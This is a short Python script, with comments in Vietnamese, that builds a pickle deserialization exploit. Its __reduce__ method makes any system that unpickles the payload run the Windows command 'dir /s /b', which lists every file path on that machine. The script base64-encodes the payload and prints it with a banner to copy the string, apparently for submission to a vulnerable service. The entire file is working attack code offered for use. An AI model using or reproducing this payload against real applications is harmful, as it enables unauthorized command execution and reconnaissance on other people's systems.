import pickle
import base64
import subprocess

class Exploit:
    def __reduce__(self):
        # Lệnh 'dir /s /b' trên Windows sẽ quét toàn bộ thư mục 
        # và liệt kê mọi đường dẫn file một cách rõ ràng.
        # subprocess.getoutput sẽ nhận lệnh này và trả về kết quả dạng chữ (string).
        return (subprocess.getoutput, ('dir /s /b',))

# Đóng gói đối tượng và chuyển sang dạng chuỗi Base64
payload = pickle.dumps(Exploit())
base64_payload = base64.b64encode(payload).decode()

print("== PAYLOAD TÌM VỊ TRÍ FILE (COPY CHUỖI DƯỚI ĐÂY) ==")
print(base64_payload)